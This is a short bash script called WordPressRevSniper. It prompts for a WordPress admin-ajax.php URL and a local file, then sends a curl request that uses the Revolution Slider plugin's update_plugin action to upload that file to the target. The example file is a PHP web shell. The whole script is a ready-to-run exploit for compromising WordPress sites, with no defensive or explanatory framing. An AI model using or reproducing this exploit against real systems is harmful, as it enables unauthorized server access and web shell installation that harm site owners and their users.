#!/bin/bash


banner() {
    echo "******************************************"
    echo "*           WordPressRevSniper           *"
    echo "*     WordPress Vulnerability Tool       *"
    echo "*      ----------------------------      *"
    echo "*                        by @ImKKingshuk *"
    echo "* Github: https://github.com/ImKKingshuk *"
    echo "******************************************"
    echo
}


banner


if ! command -v curl &> /dev/null; then
    echo "Error: 'curl' command not found. Please install curl before running this script."
    exit 1
fi


read -p "Enter the target URL (e.g., http://target_site/wp-admin/admin-ajax.php): " url


read -p "Enter the name of the file to upload (e.g., shell.php): " file_to_upload


if [ ! -f "$file_to_upload" ]; then
    echo "Error: File '$file_to_upload' not found. Please provide a valid file."
    exit 1
fi


response=$(curl -s -F "action=revslider_ajax_action" \
                    -F "client_action=update_plugin" \
                    -F "update_file=@${file_to_upload}" \
                    "$url")


if [[ "$response" == *"error"* || "$response" == *"Error"* ]]; then
    echo "Error: Something went wrong. Server response:"
    echo "$response"
else
    echo "Upload successful! Server response:"
    echo "$response"
fi
